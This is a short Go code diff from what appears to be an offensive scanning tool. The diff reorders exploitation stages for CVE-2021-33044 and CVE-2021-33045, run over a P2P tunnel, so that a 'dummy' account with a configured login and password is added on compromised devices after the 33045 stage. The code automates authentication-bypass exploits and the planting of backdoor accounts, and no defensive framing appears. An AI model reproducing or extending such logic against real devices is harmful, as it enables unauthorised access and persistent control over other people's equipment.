@@ -794,9 +794,6 @@ func (s *Scanner) processExploit(serial string, client *p2p.DHClient, tunnel *p2
 			if !finishStage("cve-2021-33044", res, err) {
 				return true
 			}
-			if addRes, addErr := TryAddDummy33044(tunnel, s.Config.Dummy.Login, s.Config.Dummy.Password, s.Config.Dummy.Memo); !finishStage("cve-2021-33044-add", addRes, addErr) {
-				return true
-			}
 		}
 
 		if s.Config.Pwn.Methods["cve-2021-33045"] {
@@ -815,6 +812,12 @@ func (s *Scanner) processExploit(serial string, client *p2p.DHClient, tunnel *p2
 
 		if s.Config.Pwn.Methods["cve-2021-33045"] {
 			if addRes, addErr := TryAddDummy33045(tunnel, s.Config.Dummy.Login, s.Config.Dummy.Password, s.Config.Dummy.Memo); !finishStage("cve-2021-33045-add", addRes, addErr) {
+				return true
+			}
+		}
+
+		if s.Config.Pwn.Methods["cve-2021-33044"] {
+			if addRes, addErr := TryAddDummy33044(tunnel, s.Config.Dummy.Login, s.Config.Dummy.Password, s.Config.Dummy.Memo); !finishStage("cve-2021-33044-add", addRes, addErr) {
 				return true
 			}
 		}
